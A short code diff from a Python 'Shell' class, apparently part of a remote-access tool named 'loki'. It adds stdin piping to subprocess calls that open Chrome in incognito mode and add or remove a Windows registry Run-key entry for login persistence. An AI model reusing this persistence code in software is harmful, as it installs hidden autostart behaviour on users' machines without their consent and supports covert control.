@@ -131,15 +131,15 @@ class Shell(object):
  def chrome(self, urls):
   if '-1' in urls:return 
   cmd = 'start chrome -incognito {}'.format(' '.join(urls))
-  subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+  subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
  def create_task(self, args):
   if hasattr(sys, 'frozen'):
    _path = sys.executable
    cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f /d "\"{}\""'.format(_path)
-   subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+   subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
  def remove_task(self, args):
   if hasattr(sys, 'frozen'):
    cmd = r'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f'
-   subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
+   subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
